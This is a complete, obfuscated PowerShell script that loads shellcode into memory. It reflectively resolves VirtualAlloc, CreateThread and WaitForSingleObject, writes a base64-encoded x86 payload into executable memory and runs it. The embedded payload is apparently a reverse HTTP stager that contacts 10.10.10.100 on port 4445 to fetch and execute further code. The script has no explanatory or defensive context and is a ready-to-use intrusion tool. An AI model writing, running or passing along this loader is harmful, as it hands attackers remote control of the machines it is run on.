function i73J {
	Param ($fFYRbXd, $ub4tx7c9MaiJ)		
	$yTYSJ6ZAB_g = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $yTYSJ6ZAB_g.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($yTYSJ6ZAB_g.GetMethod('GetModuleHandle')).Invoke($null, @($fFYRbXd)))), $ub4tx7c9MaiJ))
}

function j7IQn43tOX {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $rA_6GG,
		[Parameter(Position = 1)] [Type] $bCm1 = [Void]
	)
	
	$wR1AzPTH = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$wR1AzPTH.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $rA_6GG).SetImplementationFlags('Runtime, Managed')
	$wR1AzPTH.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $bCm1, $rA_6GG).SetImplementationFlags('Runtime, Managed')
	
	return $wR1AzPTH.CreateType()
}

[Byte[]]$mhcNLya3kBW = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1odHRwAGh3aW5oVGhMdyYH/9Ux21NTU1NTaAQfnbv/1VBTaF0RAADoTQIAAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAwADAAOgA0ADQANAA1AC8AMABJAGEATwA2AHgARwBKAE0AQQBmAGkAQgBPAE0ARgB1AHgAQwBfADQAUQBBAHIASABkAFUAOABvADUAegB3ADIAcABxAGUAXwBVAHEANABhADMASABfADUAbwBKAFMAQgBRAFUALQB1AEcASwBaAHkARwBfAFIAVAA0AHYAWQBoAE8AZABWAHAAdABMAHcAZABvADcAVgBiAHEAcgBVAE8AYQBCAEkAYwA3AGkAZAA4ADgANgB6AEIAUgBfAG0AWgBWAEMAbgBKADgAbAAtAF8ATABzADMAVwBIADUANQBTAC0AcgBLAFIATQAwAGIAUgB3AEoAWgBmAEUAYQA3AEMANAB5AEMAWQBQAE0AWQBFAEEAYgAxAEIAWABsAFQAdwAyAFoAbABNAGUAdQBuADAASwBVADAAMgAAAIPHMFBoRpsewv/VaAABAABTU1NXU1BomBCzW//VloPsEIngV4nHV2ghpwtg/9WFwHRNi0cEhcB0KlqD6jBqAVNTUGoDagOJ4IPsDInnV1BSjUQkQP8waNrd6kn/1YXAdB7rD4tHCIXAdBVqBFgBx0iJB2oMV2omVmjTWJ3O/9VqCl9TU1NTU1NWaJVYu5H/1YXAdQhPdevoYwAAAFNWaAWInXD/1YXAdO5qQGgAEAAAaAAAQABTaFikU+X/1ZNTU4nnV2gAIAAAU1ZobCkkfv/VhcB0wosHAcOFwHXlWMNf6Bv///8xADAALgAxADAALgAxADAALgAxADAAMAAAALvwtaJWagBT/9U=")
		
$yrm6 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i73J kernel32.dll VirtualAlloc), (j7IQn43tOX @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $mhcNLya3kBW.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($mhcNLya3kBW, 0, $yrm6, $mhcNLya3kBW.length)

$bt11wd = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i73J kernel32.dll CreateThread), (j7IQn43tOX @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$yrm6,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i73J kernel32.dll WaitForSingleObject), (j7IQn43tOX @([IntPtr], [Int32]))).Invoke($bt11wd,0xffffffff) | Out-Null